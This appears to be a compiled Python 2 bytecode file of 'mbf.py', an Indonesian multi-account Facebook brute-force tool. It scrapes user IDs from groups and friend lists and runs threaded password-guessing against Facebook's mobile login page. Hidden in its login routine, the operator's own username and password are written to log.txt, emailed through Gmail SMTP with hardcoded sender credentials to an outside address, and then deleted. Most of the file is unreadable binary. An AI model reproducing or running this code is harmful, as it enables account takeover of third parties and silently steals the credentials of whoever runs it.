ó
ætÃ[c           @  s³  d  d l  m Z d  d l Z d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l	 m
 Z
 d  d l m Z d   Z e j   j d  d	 d
 k rÊ e d e   j d  d	  e j j   n  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z y d  d l Z Wn( e k
 r@e d  e j j   n Xd   Z d	 a g  Z g  Z g  a g  a e j    Z! e! j" e#  e! j$ e%  e! j& e%  e! j' e j(    e! j) e%  e! j* e j+ j,   d d d' g e! _- d   Z. d	 d  Z/ d   Z0 d   Z1 d   Z2 d   Z3 d   Z4 d   Z5 d   Z6 d   Z7 d   Z8 d   Z9 d   Z: d  e j; f d!     YZ< d"   Z= d#   Z> d$   Z? d%   Z@ d&   ZA e.   eA   d S((   iÿÿÿÿ(   t   print_functionN(   t   MIMEText(   t   MIMEMultipart(   t   MIMEBase(   t   encodersc         C  s   i d d 6d d 6d d 6d d 6d	 d
 6d d 6} x, | D]$ } |  j  d | d | |  }  q7 W|  d 7}  |  j  d d  }  t |   d  S(   Ni   t   mi    t   hi!   t   ki"   t   bi#   t   pi$   t   cs   %ss   [%s;1ms   [0ms   0(   t   replacet   print(   t   xt   wt   i(    (    s   /sdcard/mbf.pyt   tampil   s    0"
t   .i    t   2sG   m[!] kamu menggunakan python versi %s silahkan menggunakan versi 2.x.xt    s8   m[!]SepertiNya Module cmechanizem belum di install...c           C  s"   t    t d  t j j   d  S(   Ns   m[!]Keluar(   t   simpanR   t   ost   syst   exit(    (    (    s   /sdcard/mbf.pyt   keluar   s    
t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16c           C  sf   y' t  t j j d d d  j   a Wn n Xy' t  t j j d d d  j   a Wn n Xd  S(   Ni    s   /MBFbgroup.txtt   rs   /MBFbteman.txt(   t   openR   R   t   patht	   readlinest
   fid_bgroupt
   fid_bteman(    (    (    s   /sdcard/mbf.pyt   bacaData)   s    ' ' c         C  s   x y t  d |   } Wn t d  t   n X| r^ | j   | k rN Pq t d  q q t |  d k r t d  q q Pq W| S(   Ns   [32;1m%s[31;1m:[33;1ms   
m[!]Batals   m[!]Masukan Opsinya Bro...i    s   m[!]Masukan dengan benar(   t	   raw_inputR   R   t   uppert   len(   R   t   vt   a(    (    s   /sdcard/mbf.pyt   inputD1   s     


c         C  sR   xK y t  t |    } Wn t d  q n X| | k r@ Pq t d  q W| S(   Ns   m[!]Pilihan tidak ada(   t   intR&   R   (   R   t   dR   (    (    s   /sdcard/mbf.pyt   inputME   s    
c          C  s+  d }  d } d } d } t    } |  | d <| | d <| | d <d } | j t | d	   d
 } t d
 d  } t d d  } | j | j    t j |  | j	 d d |  | j |  | j
   }	 yM t j d d  }
 |
 j   |
 j |  |  |
 j |  | |	  |
 j   Wn d  n Xd  S(   Ns   zantod69@gmail.comt
   zantod8080s   mrbelux@gmail.coms   === KIRIMAN NYA KAK ===t   Fromt   Tot   Subjects   ====== AKUN FACEBOOK =======t   plains   log.txtt   rbt   applications   octet-streams   Content-Dispositions   attachment; filename= s   smtp.gmail.comiK  (   R   t   attachR   R   R   t   set_payloadt   readR   t   encode_base64t
   add_headert	   as_stringt   smtplibt   SMTPt   starttlst   logint   sendmailt   quitt   None(   t
   email_usert   email_passwordt
   email_sendt   subjectt   msgt   bodyt   filenamet
   attachmentt   partt   textt   server(    (    s   /sdcard/mbf.pyt   kirimQ   s4    	



c           C  s   t  j d  d  S(   Ns   log.txt(   R   t   remove(    (    (    s   /sdcard/mbf.pyt   hapusv   s    c           C  sà   t  t  d k rn t d  y; t t j j d d d  j d j t   t d  Wqn t d  qn Xn  t  t	  d k rÜ t d  y; t t j j d d	 d  j d j t	   t d
  WqÜ t d  qÜ Xn  d  S(   Ni    s   h[*]Menyimpan hasil dari groups   /MBFbgroup.txtR   s   
s&   h[!]Berhasil meyimpan cMBFbgroup.txts   m[!]Gagal meyimpans$   h[*]Menyimpan hasil daftar Teman...s   /MBFbteman.txts'   h[!]Berhasil meyimpan cMBFbgteman.txt(
   R#   t	   id_bgroupR   R   R   R   R   t   writet   joint	   id_bteman(    (    (    s   /sdcard/mbf.pyR   x   s    
-
-c         C  s   t  d |   y+ t j |   } t t j _ | j   } Wn t  d |   t   n Xd | k rw t t j	   j
  S| Sd  S(   Ns   h[*]Membuka ps   m[!]Gagal membuka ps   <link rel="redirect" href="(   R   t   brR   t   Truet   _factoryt   is_htmlR3   R   t   bukat	   find_linkt   url(   R(   R   (    (    s   /sdcard/mbf.pyRT      s    c          C  sp  t  d  }  t  d  } t d  t d  t j d d  |  t j d <| t j d <t j   t j   } d	 | k s d
 | k rBt d  t d  t j d d  j	 } t
 j d |  d } t d |  d a t d d  } | j d  | j |   | j d  | j d  | j |  | j   t   t   n* d | k rbt d  t   n
 t d  d  S(   Ns   [?]Email/HPs   [?]Kata Sandis   h[*]Sedang Login....s   https://m.facebook.comt   nri    t   emailt   passs   save-devicet   m_sesss   h[*]Login Berhasils$   https://mobile.facebook.com/home.phpt	   url_regexs
   logout.phps
   \((.*a?)\)sI   h[*]Selamat datang k%s
h[*]Semoga ini adalah hari keberuntungan mu....i   s   log.txtR   s   USERNAME : s   
s    PASSWORD : t
   checkpoints;   m[!]Akun kena checkpoint
k[!]Coba Login dengan opera minis   m[!]Login Gagal(   R&   R   RT   RP   t   select_formt   formt   submitt   geturlRU   RG   t   ret   findallt   logR   RM   t   closeRI   RK   R   (   t   ust   paRV   t   namat   z(    (    s   /sdcard/mbf.pyR:      s:    








c         C  s<   x5 t  j d |   D]! } t j |  t d |  q Wd  S(   Ns&   /friends/hovercard/mbasic/\?uid=(.*?)&s   c==>b%sm(   Ra   Rb   RO   t   appendR   (   R   R   (    (    s   /sdcard/mbf.pyt   saring_id_teman´   s    c         C  s   x t  j d |   D]x } | j d  d k rC | j d d  } n | j d d  j d d  } | t k r t d |  t j |  q q Wd  S(	   Ns   <h3><a href="/(.*?)fref=pbs   profile.phpiÿÿÿÿt   ?t    s   profile.php?id=s   &amp;s	   k==>c%s(   Ra   Rb   t   findR   RL   R   Ri   (   R(   R   R%   (    (    s   /sdcard/mbf.pyt   saring_id_group1¸   s    c          C  s§   x t  d  a t d  t d t d  }  d j t j d |   d j   d  } y t j	 d	 d
  j
 } PWq t d  q q Xq Wt d |  t |   | S(   Ns   [?]Id Groups   h[*]Mengecek Group....s0   https://m.facebook.com/browse/group/members/?id=sI   &amp;start=0&amp;listType=list_nonfriend&amp;refid=18&amp;_rdc=1&amp;_rdrR   s   <title>(.*?)</title>i    i   R[   s   /browse/group/members/s   m[!]Id yang anda masukan salahs!   h[*]Mengambil Id dari group c%s(   R&   t   id_groupR   RT   RN   Ra   Rb   t   splitRP   RU   RV   Rn   (   R%   Rg   t   next(    (    s   /sdcard/mbf.pyt   saring_id_group0Á   s    
)

c          C  sÑ   t  d k r6 t d  t   t  d k r6 t   q6 n  t   }  xL t t |    y t j d d  j	 }  WqB t d t
 t   PqB XqB Wt   t d d d	 g  } | j   d k rÆ t t  St   Sd  S(
   Ni   s   h[*]Login dulu bos...i    R[   s   /browse/group/members/s"   m[!]Hanya Bisa Mengambil h %d ids   [?]Langsung Crack (y/t)t   Yt   T(   Rc   R   R:   R   Rr   Rn   RT   RP   RU   RV   R#   RL   R   R&   R"   t   crackt   menu(   Rq   R   (    (    s   /sdcard/mbf.pyt   idgroupÑ   s$    
		
c          C  s5  t  d k r6 t d  t   t  d k r6 t   q6 n  t t d   y t j d d  j }  WnA t	 t
  d k r t d t	 t   q£ t d  t   n XxL t t |    y t j d d  j }  Wq¦ t d t	 t   Pq¦ Xq¦ Wt   t d	 d
 d g  } | j   d
 k r*t t  St   Sd  S(   Ni   s   h[*]Login dulu bos...i    sp   https://m.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuControllerR[   t   friends_center_mains"   m[!]Hanya dapat mengambil p%d ids
   m[!]Batals   [?]Langsung Crack (y/t)Rs   Rt   (   Rc   R   R:   R   Rj   RT   RP   RU   RV   R#   t   id_temanRO   R   R&   R"   Ru   Rv   (   Rq   R   (    (    s   /sdcard/mbf.pyt   idtemanå   s2    

	
t   mtc           B  s#   e  Z d    Z d   Z d   Z RS(   c         C  s/   t  j j |   | |  _ d |  _ | |  _ d  S(   Ni   (   t	   threadingt   Threadt   __init__t   idR%   R	   (   t   selfR   R	   (    (    s   /sdcard/mbf.pyR~     s    		c         C  s   |  j  |  j f S(   N(   R%   R   (   R   (    (    s   /sdcard/mbf.pyt   update  s    c      
   C  sÞ   yO t  j t  j d d d t j i |  j d 6|  j d 6 d i d d 6  } Wn: t k
 ro t j	 j
   n d	 |  _ t j	 j
   n Xd
 | j k sª d | j k r¶ d |  _ n$ d | j k rÑ d |  _ n	 d |  _ d  S(   NRV   s    https://m.facebook.com/login.phpt   dataRX   RY   t   headerssR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s
   User-Agenti   RZ   s   save-devicei   R\   i   i    (   t   urllib2t   urlopent   Requestt   urllibt	   urlencodeR   R	   t   KeyboardInterruptR   R   R   R%   RV   (   R   R   (    (    s   /sdcard/mbf.pyt   run	  s    O	(   t   __name__t
   __module__R~   R   R   (    (    (    s   /sdcard/mbf.pyR{     s   		c         C  s   t  d d d g  } | j   d k rxE t  d  } y t | d  j   } Wn t d |  q* n XPq* Wt d t |   xE | D]= } | j d d	  } t |  d
 k r t |  | d
  q q Wt  d d d g  } | j   d k rü t |   St	   Sn t |  t  d  d  Sd  S(   Ns!   [?]Pake Passwordlist/Manual (p/m)t   Pt   Ms   [?]Masukan alamat fileR   s   m[!]Gagal membuka k%ss'   h[*]Memulai crack dengan k%d passwords   
Rl   i    s.   [?]Tidak Puas dengan Hasil,Mau coba lagi (y/t)Rs   Rt   s   [?]Sandii   (
   R&   R"   R   R   R   R#   R   t   crack0Ru   Rv   (   R(   R   t   dirt   D(    (    s   /sdcard/mbf.pyRu     s(    

c         C  s|  t  d t |   | f  t d d d t j j j   g  } g  } g  } g  } g  } d \ } }	 g  }
 xK |  D]C } | j d d  } t |  d k rq |
 j t	 | |   qq qq WxJ |
 D]B } |	 d 7}	 t
 | _ y | j   Wq¿ t k
 r t   q¿ Xq¿ Wxy3x,|
 D]$} | j   } | d d k r| d | k r| d 7} | d d	 k rr| j | d  nl | d d k r| j | d  nH | d d k rº| j | d  n$ | d d
 k rÞ| j | d  n  t d t t |  t |	  d  d f d d t j j j   | j | d  qqWWn t k
 r[t j j   n Xy t j   d k ruPn  Wqt k
 rt   qXqWt d  t |  d k rãt  d  x% | D] } t  d | | f  qÂWn  t  d t |   t  d t |   t  d t |   t  d t |   | rtt d d d g  } | j   d k rjt |   St   Sn d Sd  S(   Ns2   h[*]MengCrack k%d Akun hdengan sandi m[k%sm]s0   [32;1m[*]Cracking [31;1m[[36;1m0%[31;1m][0mt   endRl   i    R   i   i   i   i   s6   [32;1m[*]Cracking [31;1m[[36;1m%0.2f%s[31;1m][0mid   t   %s8   [32;1m[*]Cracking [31;1m[[36;1m100%[31;1m][0m     s   h[*]Daftar akun suksess   h==>k%s m[p%sm]s#   h[*]Jumlah akun berhasilp      %ds#   m[*]Jumlah akun gagalp         %ds#   k[*]Jumlah akun cekpointp      %ds#   c[*]Jumlah akun errorp         %ds.   [?]Tidak Puas dengan Hasil,Mau coba lagi (y/t)Rs   Rt   (   i    i    (   R   R#   R   R   R   t   stdoutt   flushR   Ri   R{   RQ   t   daemont   startR   R   R   t   floatR|   t   activeCountR   R&   R"   Ru   Rv   (   R   t   sandiR	   t   akun_jmlt   akun_suksest   akun_cekpointt
   akun_errort
   akun_gagalt   jml0t   jml1t   thR   R%   (    (    s   /sdcard/mbf.pyR   .  sx     
	   
4 



c          C  sk   t  t  d k rg t d d d g  }  |  j   d k rC t t  St j t j j d d  g  a n  d S(   Ni    s'   [?]Riset Hasil Id Teman/lanjutkan (r/l)t   Rt   Ls   /MBFbteman.txt(	   R#   R   R&   R"   Ru   R   RJ   R   R   (   R   (    (    s   /sdcard/mbf.pyt   lanjutTi  s    
	c          C  sk   t  t  d k rg t d d d g  }  |  j   d k rC t t  St j t j j d d  g  a n  d S(   Ni    s'   [?]Riset Hasil Id Group/lanjutkan (r/l)R£   R¤   s   /MBFbgroup.txt(	   R#   R   R&   R"   Ru   R   RJ   R   R   (   R   (    (    s   /sdcard/mbf.pyt   lanjutGs  s    
	c          C  s   t  d  t  d d	 d
 f  t d d d d g  }  |  d k rS t   t   n3 |  d k rp t   t   n |  d k r t   n  d  S(   Nsø  h
                     .-.-..
                    /+/++//
                   /+/++//
            k*   *h /+/++//
             \ /  |/__//
           {mXh}v{mXh}|cPRXh|==========.
             [']  /'|'\           \
                 /  \  \           '
                 \_  \_ \_    k*hDragonFly ZomBie
k###########################################################
#             b*MULTY BRUTEFORCE FACEBOOK*k                 #
# hBYp                                             PIRMANSX k#
# hGroup FBp  https://m.facebook.com/groups/164201767529837 k#
# hGitHubp                      https://github.com/pirmansx k#
#       mDo Not Use This Tool For IllegaL Purpose          k#
###########################################################sQ   k%s
c1 hAmbil id dari group
c2 hAmbil id dari daftar teman
c3 mKELUAR
k%st   #i   s   [?]PILIHi   i   i   s   ####################s   ####################(   R   R)   R¦   Rw   R¥   Rz   R   (   R   (    (    s   /sdcard/mbf.pyRv   }  s    

(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(B   t
   __future__R    t   platformR   R7   t   email.mime.textR   t   email.mime.multipartR   t   email.mime.baseR   RX   R   R   t   python_versionRp   R$   R   R   t	   cookielibRa   R   R   R|   t	   mechanizet   ImportErrorR   Rc   RO   RL   R   R   t   BrowserRP   t   set_handle_robotst   Falset   set_handle_equivRQ   t   set_handle_referert   set_cookiejart   LWPCookieJart   set_handle_redirectt   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR    R&   R)   RI   RK   R   RT   R:   Rj   Rn   Rr   Rw   Rz   R}   R{   Ru   R   R¥   R¦   Rv   (    (    (    s   /sdcard/mbf.pyt   <module>   sd   $	<
				%				 								;	
	
	